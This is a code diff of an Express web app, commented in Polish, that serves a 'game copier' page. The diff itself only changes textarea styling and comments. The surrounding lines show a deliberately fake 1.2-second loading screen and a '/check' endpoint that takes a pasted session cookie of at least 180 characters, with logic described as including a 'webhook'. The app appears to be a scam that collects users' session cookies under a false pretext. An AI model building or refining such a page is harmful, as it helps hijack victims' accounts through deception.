@@ -64,7 +64,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – z 1.2s sztucznym loadingiem + modalem
+// Podstrona /game-copier – bez możliwości przesuwania/rozciągania pola tekstowego
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -84,7 +84,6 @@ app.get('/game-copier', (req, res) => {
       position: relative;
     }
     canvas { position:fixed; inset:0; z-index:1; pointer-events:none; }
-
     .container {
       position: relative;
       z-index: 2;
@@ -238,15 +237,16 @@ app.get('/game-copier', (req, res) => {
     }
     textarea {
       width: 100%;
-      min-height: 180px;
+      height: 180px;            /* stała wysokość */
       background: transparent;
       border: none;
       outline: none;
-      resize: none;
+      resize: none;             /* NIE DA SIĘ ROZCIĄGAĆ / PRZESUWAĆ */
       font-family: Consolas, "Courier New", monospace;
       font-size: 14.5px;
       color: #111;
       line-height: 1.5;
+      overflow-y: auto;         /* scroll w pionie jeśli tekst za długi */
     }
     textarea::placeholder {
       color: #777;
@@ -403,7 +403,7 @@ function animate() {
 }
 animate();
 
-// ── Funkcje modal i loading ──
+// ── Loading + Modal ──
 const loading = document.getElementById('loading');
 const modal = document.getElementById('modal');
 const modalIcon = document.getElementById('modal-icon');
@@ -423,17 +423,17 @@ function showModal(success, message, tip = '') {
   modal.style.display = 'flex';
 }
 
-// Logika przycisku z loadingiem 1.2s
+// Logika przycisku z 1.2s loadingiem
 async function start() {
   const btn = document.getElementById('btn');
   const raw = document.getElementById('input').value.trim();
 
   btn.disabled = true;
 
-  // Pokazujemy sztuczne ładowanie
+  // Pokazujemy sztuczne ładowanie na 1.2 sekundy
   loading.style.display = 'flex';
 
-  // Czekamy 1.2 sekundy (sztuczne opóźnienie)
+  // Czekamy 1200 ms
   await new Promise(resolve => setTimeout(resolve, 1200));
 
   // Ukrywamy loading
@@ -490,7 +490,7 @@ async function start() {
   `);
 });
 
-// Endpoint /check – bez zmian
+// Endpoint /check – bez zmian (cała logika + webhook)
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
